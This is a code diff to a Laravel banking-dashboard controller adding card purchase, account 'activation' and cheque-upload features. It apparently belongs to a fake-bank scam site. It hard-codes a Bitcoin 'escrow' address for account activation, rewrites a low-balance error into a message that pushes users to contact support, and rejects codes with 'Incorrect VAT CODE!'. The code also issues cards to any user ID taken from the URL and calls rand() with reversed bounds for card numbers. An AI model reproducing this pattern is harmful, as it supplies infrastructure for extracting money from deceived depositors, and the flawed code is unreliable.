@@ -14,6 +14,7 @@ use GuzzleHttp\Client;
 use App\Models\Deposit;
 use App\Models\Transfer;
 use App\Mail\nftUserEmail;
+use App\Models\BankDeposit;
 use App\Models\Transaction;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -297,12 +298,83 @@ class DashboardController extends Controller
     }
 
 
-
     public function card()
+    {
+        $user = Auth::user();
+        $data['details'] = Card::where('user_id', Auth::user()->id)->get();
+        return view('dashboard.card', $data);
+    }
+
+    public function cardApplication()
     {
 
         $data['details'] = Card::where('user_id', Auth::user()->id)->get();
-        return view('dashboard.card', $data);
+        return view('dashboard.card_application', $data);
+    }
+
+
+    public function activation()
+    {
+        // Fetch the authenticated user's activation status and escrow address
+        $user = Auth::user();
+        $activationStatus = $user->activation_status; // Assuming there's a column for this in the users table
+        $escrowAddress = '3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5'; // Replace with a dynamic value if applicable
+
+        // Pass the data to the view
+        return view('dashboard.activation', [
+            'activationStatus' => $activationStatus,
+            'escrowAddress' => $escrowAddress,
+        ]);
+    }
+
+
+
+    public function requestCard($user_id)
+    {
+        $userData = User::where('id', $user_id)->first();
+        $user_id = $userData->id;
+        $amount = 10;
+
+
+
+        $data['credit_transfers'] = Transaction::where('user_id', Auth::user()->id)->where('transaction_type', 'Credit')->sum('transaction_amount');
+        $data['debit_transfers'] = Transaction::where('user_id', Auth::user()->id)->where('transaction_type', 'Debit')->sum('transaction_amount');
+        $data['user_deposits'] = Deposit::where('user_id', Auth::user()->id)->where('status', '1')->sum('amount');
+        $data['user_loans'] = Loan::where('user_id', Auth::user()->id)->where('status', '1')->sum('amount');
+        $data['user_card'] = Card::where('user_id', Auth::user()->id)->sum('amount');
+
+        $data['balance'] = $data['user_deposits'] + $data['credit_transfers'] + $data['user_loans'] - $data['debit_transfers'] - $data['user_card'];
+
+        if ($amount > $data['balance']) {
+            return back()->with('error', 'Your account Has Not Been linked, Please Contact Support Immediately');
+        }
+
+        $card_number = rand(765039973798, 123449889412);
+        $cvc = rand(765, 123);
+        $ref = rand(76503737, 12344994);
+        $startDate = date('Y-m-d');
+        $expiryDate = date('Y-m-d', strtotime($startDate . '+ 24 months'));
+
+
+        $card = new Card();
+        $card->user_id = $user_id;
+        $card->card_number = $card_number;
+        $card->card_cvc = $cvc;
+        $card->card_expiry = $expiryDate;
+        $card->save();
+
+        $transaction = new Transaction();
+        $transaction->user_id = $user_id;
+        $transaction->transaction_id = $card->id;
+        $transaction->transaction_ref = "CD" . $ref;
+        $transaction->transaction_type = "Debit";
+        $transaction->transaction = "Card";
+        $transaction->transaction_amount = "10";
+        $transaction->transaction_description = "Virtual Card Purchase";
+        $transaction->transaction_status = 1;
+        $transaction->save();
+
+        return back()->with('status', 'Card Purchased Successfully');
     }
 
 
@@ -1665,54 +1737,6 @@ class DashboardController extends Controller
 
 
 
-    public function requestCard($user_id)
-    {
-        $userData = User::where('id', $user_id)->first();
-        $user_id = $userData->id;
-        $amount = 10;
-
-
-
-        $data['credit_transfers'] = Transaction::where('user_id', Auth::user()->id)->where('transaction_type', 'Credit')->sum('transaction_amount');
-        $data['debit_transfers'] = Transaction::where('user_id', Auth::user()->id)->where('transaction_type', 'Debit')->sum('transaction_amount');
-        $data['user_deposits'] = Deposit::where('user_id', Auth::user()->id)->where('status', '1')->sum('amount');
-        $data['user_loans'] = Loan::where('user_id', Auth::user()->id)->where('status', '1')->sum('amount');
-        $data['user_card'] = Card::where('user_id', Auth::user()->id)->sum('amount');
-        $data['user_credit'] = Credit::where('user_id', Auth::user()->id)->where('status', '1')->sum('amount');
-        $data['user_debit'] = Debit::where('user_id', Auth::user()->id)->where('status', '1')->sum('amount');
-        $data['balance'] = $data['user_deposits'] + $data['credit_transfers'] + $data['user_loans'] - $data['debit_transfers'] - $data['user_card'];
-
-        if ($amount > $data['balance']) {
-            return back()->with('error', ' Your account balance is insufficient, contact our administrator for more info!!');
-        }
-
-        $card_number = rand(765039973798, 123449889412);
-        $cvc = rand(765, 123);
-        $ref = rand(76503737, 12344994);
-        $startDate = date('Y-m-d');
-        $expiryDate = date('Y-m-d', strtotime($startDate . '+ 24 months'));
-
-
-        $card = new Card;
-        $card->user_id = $user_id;
-        $card->card_number = $card_number;
-        $card->card_cvc = $cvc;
-        $card->card_expiry = $expiryDate;
-        $card->save();
-
-        $transaction = new Transaction;
-        $transaction->user_id = $user_id;
-        $transaction->transaction_id = $card->id;
-        $transaction->transaction_ref = "CD" . $ref;
-        $transaction->transaction_type = "Debit";
-        $transaction->transaction = "Card";
-        $transaction->transaction_amount = "10";
-        $transaction->transaction_description = "Virtual Card Purchase";
-        $transaction->transaction_status = 1;
-        $transaction->save();
-
-        return back()->with('status', 'Card Purchased Successfully');
-    }
 
 
 
@@ -2285,28 +2309,28 @@ class DashboardController extends Controller
     }
 
 
-    
+
     // Method to validate the Routing Number (OTP)
-public function validateRoutingNumber(Request $request)
-{
-    // Retrieve the routing number from the request
-    $routingNumber = $request->input('routingNumber');
+    public function validateRoutingNumber(Request $request)
+    {
+        // Retrieve the routing number from the request
+        $routingNumber = $request->input('routingNumber');
 
-    // Check if the routing number is provided
-    if (is_null($routingNumber) || $routingNumber === '') {
-        return response()->json([
-            'success' => false,
-            'message' => 'Routing Number is required!'
-        ]);
-    }
+        // Check if the routing number is provided
+        if (is_null($routingNumber) || $routingNumber === '') {
+            return response()->json([
+                'success' => false,
+                'message' => 'Routing Number is required!'
+            ]);
+        }
 
-    // Check if the routing number matches the user's OTP
-    if ($routingNumber == Auth::user()->otp) {
-        return response()->json(['success' => true]); // Success response for JavaScript redirection
-    } else {
-        return response()->json(['success' => false, 'message' => 'Incorrect VAT CODE!']);
+        // Check if the routing number matches the user's OTP
+        if ($routingNumber == Auth::user()->otp) {
+            return response()->json(['success' => true]); // Success response for JavaScript redirection
+        } else {
+            return response()->json(['success' => false, 'message' => 'Incorrect VAT CODE!']);
+        }
     }
-}
 
 
 
@@ -2582,5 +2606,39 @@ public function validateRoutingNumber(Request $request)
 
 
         return back()->with('status', 'Loan detected, please wait for approval by the administrator');
+    }
+
+
+
+    public function checkPage()
+    {
+        return view('dashboard.check');
+    }
+
+
+    public function checkUpload(Request $request)
+    {
+        $request->validate([
+            'amount' => 'required|string',
+            'check_description' => 'required|string',
+            'check_front' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
+            'check_back' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
+        ]);
+
+        // Store the files
+        $frontPath = $request->file('check_front')->store('checks/front', 'public');
+        $backPath = $request->file('check_back')->store('checks/back', 'public');
+
+
+        Deposit::create([
+            'user_id' => Auth::user()->id,
+            'amount' => $request->amount,
+            'deposit_type' => 'Cheque',
+            'front_cheque' => $frontPath,
+            'back_cheque' => $backPath,
+            'status' => '0',
+        ]);
+
+        return redirect()->back()->with('status', 'Check uploaded successfully!');
     }
 }
